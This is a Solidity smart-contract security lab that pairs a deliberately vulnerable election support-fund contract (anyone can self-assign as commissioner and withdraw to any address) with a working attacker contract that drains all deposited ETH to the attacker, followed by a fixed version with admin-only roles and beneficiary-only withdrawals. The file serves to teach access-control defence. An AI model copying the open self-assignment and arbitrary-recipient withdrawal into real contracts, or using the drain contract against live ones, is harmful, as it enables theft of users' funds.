// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ELECTION ASSISTANCE COMMISSION – SMART CONTRACT LAB
 *
 *  This single file contains:
 *
 *  1) ElectionAssistanceCommissionV1        – vulnerable election support & commissioner manager
 *  2) ElectionAssistanceCommissionAttacker  – attacker that hijacks commissioner role & funds
 *  3) ElectionAssistanceCommissionV2Defense – secure version with proper roles & safe grants
 *
 *  Concept:
 *    - Commission manages elections and support funds for them.
 *    - Elections have "commissioners" who can release support funds.
 *
 *    V1 BUG:
 *      - Anyone can call selfAssignCommissioner(electionId) and become a commissioner.
 *      - Commissioners can withdraw support funds to arbitrary addresses.
 *      - → An attacker can fund the contract, self-assign, and sweep all ETH.
 *
 *    V2 FIX:
 *      - Only global admin can assign commissioners and set beneficiaries.
 *      - Withdrawal can only go to predefined beneficiary, never arbitrary addresses.
 *      - No self-appointment, no free-form fund drains.
 */


/* ============================================================= */
/*      1. VULNERABLE ELECTION ASSISTANCE COMMISSION (V1)        */
/* ============================================================= */

contract ElectionAssistanceCommissionV1 {
    struct Election {
        string name;
        uint64 startTs;
        uint64 endTs;
        bool exists;
        uint256 totalSupportFunds; // total funds allocated (accounting only)
        address[] commissionerList;
        mapping(address => bool) isCommissioner;
    }

    address public chair; // not really enforced in V1, just here for show
    uint256 public electionCounter;
    mapping(uint256 => Election) private elections;

    event ElectionCreated(uint256 indexed id, string name, uint64 startTs, uint64 endTs);
    event FundsDeposited(uint256 indexed id, address indexed from, uint256 amount);
    event CommissionerSelfAssigned(uint256 indexed id, address indexed commissioner);
    event SupportFundsWithdrawn(uint256 indexed id, address indexed to, uint256 amount);

    constructor() {
        chair = msg.sender;
    }

    // Create a new election
    function createElection(
        string memory name,
        uint64 startTs,
        uint64 endTs
    ) external returns (uint256) {
        require(startTs < endTs, "invalid period");

        electionCounter++;
        uint256 id = electionCounter;

        Election storage e = elections[id];
        e.name = name;
        e.startTs = startTs;
        e.endTs = endTs;
        e.exists = true;

        emit ElectionCreated(id, name, startTs, endTs);
        return id;
    }

    // Deposit support funds for an election (anyone can fund)
    function depositSupportFunds(uint256 electionId) external payable {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(msg.value > 0, "no value");

        e.totalSupportFunds += msg.value;
        emit FundsDeposited(electionId, msg.sender, msg.value);
    }

    /*
     *  ⚠️ VULNERABILITY: SELF-ASSIGNED COMMISSIONER
     *
     *  Anyone can call this and become a commissioner for ANY election.
     *  No admin / chair check at all.
     */
    function selfAssignCommissioner(uint256 electionId) external {
        Election storage e = elections[electionId];
        require(e.exists, "no election");

        if (!e.isCommissioner[msg.sender]) {
            e.isCommissioner[msg.sender] = true;
            e.commissionerList.push(msg.sender);
        }

        emit CommissionerSelfAssigned(electionId, msg.sender);
    }

    /*
     *  ⚠️ VULNERABILITY: UNRESTRICTED WITHDRAW TO ARBITRARY ADDRESS
     *
     *  - Any self-assigned commissioner can drain the election's funds
     *    to ANY recipient address they choose.
     *  - There's no concept of "beneficiary" or safeguards.
     */
    function withdrawSupportFunds(
        uint256 electionId,
        address payable to,
        uint256 amount
    ) external {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(e.isCommissioner[msg.sender], "not commissioner");
        require(amount > 0, "zero");
        require(address(this).balance >= amount, "insufficient balance");

        // No checks how much was actually allocated vs total, just raw balance
        e.totalSupportFunds -= amount;

        (bool ok, ) = to.call{value: amount}("");
        require(ok, "send failed");

        emit SupportFundsWithdrawn(electionId, to, amount);
    }

    function isCommissioner(uint256 electionId, address who) external view returns (bool) {
        Election storage e = elections[electionId];
        return e.isCommissioner[who];
    }

    function getElectionMeta(uint256 electionId)
        external
        view
        returns (
            string memory name,
            uint64 startTs,
            uint64 endTs,
            uint256 totalSupportFunds,
            bool exists
        )
    {
        Election storage e = elections[electionId];
        return (e.name, e.startTs, e.endTs, e.totalSupportFunds, e.exists);
    }

    function getCommissioners(uint256 electionId) external view returns (address[] memory) {
        Election storage e = elections[electionId];
        return e.commissionerList;
    }
}


/* ============================================================= */
/*                  2. ATTACKER CONTRACT (LAB)                   */
/* ============================================================= */

contract ElectionAssistanceCommissionAttacker {
    ElectionAssistanceCommissionV1 public target;
    address public attacker;

    event AttackStarted(uint256 indexed electionId, uint256 deposit);
    event AttackDrained(uint256 indexed electionId, uint256 amount);

    constructor(address _target) {
        target = ElectionAssistanceCommissionV1(_target);
        attacker = msg.sender;
    }

    /*
     *  Attack flow:
     *   1. Attacker sends some ETH to target.depositSupportFunds(electionId).
     *   2. Attacker calls target.selfAssignCommissioner(electionId).
     *   3. Attacker calls target.withdrawSupportFunds(electionId, attacker, fullBalance).
     *   4. Because V1 allows arbitrary to + self-commission, attacker can
     *      sweep all funds for that election (including others' deposits).
     */

    function attackElection(uint256 electionId) external payable {
        require(msg.sender == attacker, "not attacker");
        require(msg.value > 0, "send some ETH");

        // Step 1: fund the election (plus maybe others also funded it)
        target.depositSupportFunds{value: msg.value}(electionId);
        emit AttackStarted(electionId, msg.value);

        // Step 2: self-assign as commissioner
        target.selfAssignCommissioner(electionId);

        // Step 3: drain as much as possible
        uint256 balance = address(target).balance;

        target.withdrawSupportFunds(electionId, payable(address(this)), balance);
        emit AttackDrained(electionId, balance);

        // Forward stolen funds to actual attacker EOA
        if (address(this).balance > 0) {
            (bool ok, ) = payable(attacker).call{value: address(this).balance}("");
            require(ok, "forward failed");
        }
    }

    receive() external payable {}
}


/* ============================================================= */
/*       3. SECURE ELECTION ASSISTANCE COMMISSION (V2)           */
/* ============================================================= */

contract ElectionAssistanceCommissionV2Defense {
    struct Election {
        string name;
        uint64 startTs;
        uint64 endTs;
        bool exists;
        uint256 totalSupportFunds;  // accounting of deposits for this election
        address beneficiary;        // where support funds are allowed to go
        address[] commissionerList; // audit list
        mapping(address => bool) isCommissioner;
    }

    address public chair; // global admin
    uint256 public electionCounter;
    mapping(uint256 => Election) private elections;

    event ElectionCreated(
        uint256 indexed id,
        string name,
        uint64 startTs,
        uint64 endTs,
        address beneficiary
    );
    event FundsDeposited(uint256 indexed id, address indexed from, uint256 amount);
    event CommissionerAssigned(uint256 indexed id, address indexed commissioner);
    event CommissionerRevoked(uint256 indexed id, address indexed commissioner);
    event BeneficiaryChanged(uint256 indexed id, address indexed oldBeneficiary, address indexed newBeneficiary);
    event SupportFundsWithdrawn(uint256 indexed id, address indexed beneficiary, uint256 amount);

    modifier onlyChair() {
        require(msg.sender == chair, "not chair");
        _;
    }

    modifier onlyCommissioner(uint256 electionId) {
        Election storage e = elections[electionId];
        require(e.isCommissioner[msg.sender], "not commissioner");
        _;
    }

    constructor() {
        chair = msg.sender;
    }

    function changeChair(address newChair) external onlyChair {
        require(newChair != address(0), "zero");
        chair = newChair;
    }

    // Create a new election with a predefined beneficiary
    function createElection(
        string memory name,
        uint64 startTs,
        uint64 endTs,
        address beneficiary
    ) external onlyChair returns (uint256) {
        require(startTs < endTs, "invalid period");
        require(beneficiary != address(0), "invalid beneficiary");

        electionCounter++;
        uint256 id = electionCounter;

        Election storage e = elections[id];
        e.name = name;
        e.startTs = startTs;
        e.endTs = endTs;
        e.exists = true;
        e.beneficiary = beneficiary;

        emit ElectionCreated(id, name, startTs, endTs, beneficiary);
        return id;
    }

    // Anyone can deposit support funds for an election
    function depositSupportFunds(uint256 electionId) external payable {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(msg.value > 0, "no value");

        e.totalSupportFunds += msg.value;
        emit FundsDeposited(electionId, msg.sender, msg.value);
    }

    // Chair assigns a commissioner
    function assignCommissioner(uint256 electionId, address commissioner) external onlyChair {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(commissioner != address(0), "zero");

        if (!e.isCommissioner[commissioner]) {
            e.isCommissioner[commissioner] = true;
            e.commissionerList.push(commissioner);
            emit CommissionerAssigned(electionId, commissioner);
        }
    }

    // Chair revokes commissioner
    function revokeCommissioner(uint256 electionId, address commissioner) external onlyChair {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(e.isCommissioner[commissioner], "not commissioner");

        e.isCommissioner[commissioner] = false;
        emit CommissionerRevoked(electionId, commissioner);
        // Note: we keep commissionerList as an audit log; we don't remove from array
    }

    // Chair can change beneficiary (e.g., updated official account)
    function changeBeneficiary(uint256 electionId, address newBeneficiary) external onlyChair {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(newBeneficiary != address(0), "zero");

        address old = e.beneficiary;
        e.beneficiary = newBeneficiary;

        emit BeneficiaryChanged(electionId, old, newBeneficiary);
    }

    /*
     *  🔒 SECURE WITHDRAW:
     *
     *   - Only commissioners (assigned by chair) can initiate withdrawal.
     *   - Funds can only go to the pre-registered beneficiary address.
     *   - No arbitrary "to" parameter → attacker cannot redirect funds.
     *   - Amount limited by election's accounted supportFunds and contract balance.
     */
    function withdrawSupportFunds(uint256 electionId, uint256 amount)
        external
        onlyCommissioner(electionId)
    {
        Election storage e = elections[electionId];
        require(e.exists, "no election");
        require(amount > 0, "zero");
        require(e.totalSupportFunds >= amount, "over allocation");
        require(address(this).balance >= amount, "insufficient balance");

        e.totalSupportFunds -= amount;

        (bool ok, ) = payable(e.beneficiary).call{value: amount}("");
        require(ok, "send failed");

        emit SupportFundsWithdrawn(electionId, e.beneficiary, amount);
    }

    // -------- VIEW FUNCTIONS FOR AUDIT / OFF-CHAIN USE ----------

    function isCommissioner(uint256 electionId, address who) external view returns (bool) {
        Election storage e = elections[electionId];
        return e.isCommissioner[who];
    }

    function getElectionMeta(uint256 electionId)
        external
        view
        returns (
            string memory name,
            uint64 startTs,
            uint64 endTs,
            uint256 totalSupportFunds,
            address beneficiary,
            bool exists
        )
    {
        Election storage e = elections[electionId];
        return (e.name, e.startTs, e.endTs, e.totalSupportFunds, e.beneficiary, e.exists);
    }

    function getCommissioners(uint256 electionId) external view returns (address[] memory) {
        Election storage e = elections[electionId];
        return e.commissionerList;
    }
}
